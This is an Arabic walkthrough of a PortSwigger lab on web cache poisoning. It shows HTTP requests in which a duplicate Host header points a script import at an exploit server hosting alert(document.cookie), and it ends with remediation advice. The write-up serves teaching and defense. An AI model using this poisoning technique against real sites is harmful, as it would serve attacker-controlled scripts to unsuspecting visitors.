# [Web cache poisoning via ambiguous requests](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests)

## **`الهدف`**
قم بتسميم ذاكرة التخزين المؤقت باستجابة تقوم بتنفيذ `alert(document.cookie)` في متصفح الضحية.
## **`خطوات الحل`**
بعد الدخول إلى اللاب سنقوم بفحص الاستجابة الخاصة بطلب الدخول إلى  اللاب
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 19
X-Cache: hit
Connection: close
Content-Length: 11067
```

وسنلاحظ وجود معلم `Age و X-Cache:` بقيمتي ` 19 و hit` لذلك سنقوم بنقل الطلب إلى `Repeater` لنقوم ببعض التجارب،
حيث سنلاحظ إذا انتظرنا دقيقة مثلا وقمنا بتكرار الطلب فمعلم `X-Cache:` تكون قيمته `miss` كما أن معلم `Age` قيمته `0` 
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Connection: close
Content-Length: 11067
```
وهذا يعنى أنه تم إنشاء `Cashe` جديد
ولكن لكي لا نحتاج إلى الانتظار فيمكن أن نعدل المسار في الطلب إلى أى شئ مثل  `GET /?TEST=123` وكلما أردنا `Cashe` جديد نقوم بتغيير الرقم
```http
GET /?TEST=123 HTTP/1.1
Host: 0a33009b04c895b48036f8e2005a002e.h1-web-security-academy.net
Cookie: session=BoRMUqITpQhe4FB5zPrZDUSRFhEEPW7b; _lab=47%7cMC0CFQCV2ZWmsLievACxoPrBKDcAcnl7WQIUdmBA2uK2AUA3%2bXL37Sb4rZ3X5sMdGmRM8fiGgES0yTCtbOIGITw2okgzzIS4L7G7cw4xfndN0WXjd1EFsz8v4uuHXgw%2f8I1Yc618BQtfseP%2fSu1G4Plic3tr3kjDSzm4pzvkk6UVVzkjho79
Cache-Control: max-age=0
```
وعند محاولة تغيير الـ `Host` سنجد أن هناك خطأ يحدث في الاستجابة
```http
HTTP/1.1 504 Gateway Timeout
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 150

<html>
	<head>
		<title>
			Server Error: Gateway Timeout
		</title>
	</head>
	<body>
		<h1>
		Server Error: Gateway Timeout (1) connecting to google.com
		</h1>
	</body>
</html>
```

وعند إضافة `Host` أخر
```http
GET /?TEST=123 HTTP/1.1
Host: 0a33009b04c895b48036f8e2005a002e.h1-web-security-academy.net
Host: example.com
Cookie: session=BoRMUqITpQhe4FB5zPrZDUSRFhEEPW7b; _lab=47%7cMC0CFQCV2ZWmsLievACxoPrBKDcAcnl7WQIUdmBA2uK2AUA3%2bXL37Sb4rZ3X5sMdGmRM8fiGgES0yTCtbOIGITw2okgzzIS4L7G7cw4xfndN0WXjd1EFsz8v4uuHXgw%2f8I1Yc618BQtfseP%2fSu1G4Plic3tr3kjDSzm4pzvkk6UVVzkjho79
Cache-Control: max-age=0
```
سنجد أنه يتم تجاهل معلم `Host` الثاني ولكن بفحص الإستجابة عن كثب
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Connection: close
Content-Length: 11018

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Web cache poisoning via ambiguous requests</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script type="text/javascript" src="//example.com/resources/js/tracking.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
```

سنجد أنه ينعكس كـ `absolute URL` يستخدم لاستيراد سكريبت.

لذلك سنقوم بالدخول إلى سيرفر الاستغلال الموجود في اللاب، ونقوم بتعديل حقل `File` إلى `/resources/js/tracking.js` ونقوم بحقن `alert(document.cookie)` في حقل `Body` ونضغط `Store`

ثم نقوم بنسخ رابط سيرفر الاستغلال ونقوم بحقنه فى معلم `Host` الثاني في الطلب الأصلى للصفحة الرئيسية مع حذف الـ `/?TEST=123`
```http
GET / HTTP/1.1
Host: 0a33009b04c895b48036f8e2005a002e.h1-web-security-academy.net
Host: exploit-0a77001f04b3959980bdf72b01b80000.exploit-server.net
Cookie: session=BoRMUqITpQhe4FB5zPrZDUSRFhEEPW7b; _lab=47%7cMC0CFQCV2ZWmsLievACxoPrBKDcAcnl7WQIUdmBA2uK2AUA3%2bXL37Sb4rZ3X5sMdGmRM8fiGgES0yTCtbOIGITw2okgzzIS4L7G7cw4xfndN0WXjd1EFsz8v4uuHXgw%2f8I1Yc618BQtfseP%2fSu1G4Plic3tr3kjDSzm4pzvkk6UVVzkjho79
Cache-Control: max-age=0
```
وقد نحتاج لتكرار إرسال الطلب أكثر من مرة حتى يتم تجديد الـ `Cashe` وبعد ذلك نعود إلى اللاب ونضغط `Home` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب التأكد من أن جميع الطبقات في بنية النظام `(WAF, Cache, Load Balancer, Backend)` تتحدث نفس اللغة وتفسر الطلبات بنفس الطريقة، فإذا كان الـ `Cache` يعتبر ترويسة `Host` الأولى هي الأساس، فيجب أن يتعامل الـ `Backend` مع الترويسة الأولى أيضاً، ولكن الحل الأكثر هو  إعداد السيرفر الأمامي (مثل `Varnish` أو `Nginx` أو `Cloudflare`) والسيرفر الخلفي ليقوما برفض أي طلب يحتوي على ترويسات `Host` مكررة وإرجاع رسالة خطأ `400 Bad Request`، ولا ينبغي محاولة تخمين أي ترويسة هي الصحيحة أو دمجهم، بل يجب رفض الطلب المشوه فوراً.

ويجب استخدام مسارات نسبية `Relative Paths` لاستدعاء سكريبتات موجودة على نفس السيرفر، فيجب تعديل الكود ليكون:
```html
<script 
	src="/resources/js/tracking.js">
</script>
```

ويجب ألا يعتمد التطبيق نهائياً على أي `HTTP Headers` (مثل `Host` أو `X-Forwarded-Host`) القادمة من المستخدم (لأنها `User Input` يمكن التلاعب به)، وبدلاً من ذلك، يجب الاعتماد على متغير ثابت داخل ملفات إعدادات التطبيق أو متغيرات البيئة` Environment Variables`.

وإذا لم تكن البنية التحتية للموقع تستخدم `Reverse Proxy` أو` Load Balancer` يتطلب استخدام ترويسة `X-Forwarded-Host` لعمله الداخلي، فيجب إعداد الـ `Middleware` أو سيرفر الويب (مثل `Nginx` أو `Apache`) ليتجاهل أو يحذف هذه الترويسة تماماً من أي `Request` قادم قبل أن يصل إلى الواجهة الخلفية `back-end.`

وإذا كانت البنية التحتية مجبرة على استخدام ترويسات `X-Forwarded-*` في نظامها ولا يمكن حذفها، فيجب إعداد سيرفر ذاكرة التخزين المؤقت ليقوم بدمج هذه الترويسة ضمن مفتاح التخزين المؤقت `Cache Key`، ويتم ذلك عن طريق إعلام سيرفر التخزين المؤقت `Cache Server` بذلك برمجياً عن طريق إضافة الترويسات `Vary: X-Forwarded-Host` و `Vary: X-Forwarded-Scheme`  أو ضبط إعدادات السيرفر (مثل `Varnish أو Cloudflare`) لضم هذا الكوكي المحدد إلى الـ `Cache Key`، مما يضمن أن الاستجابة المسممة سيتم تخزينها وتقديمها فقط للطلبات التي تحتوي على نفس القيمة الخبيثة في الترويسة، ولن تنعكس نهائياً على الزوار الطبيعيين.
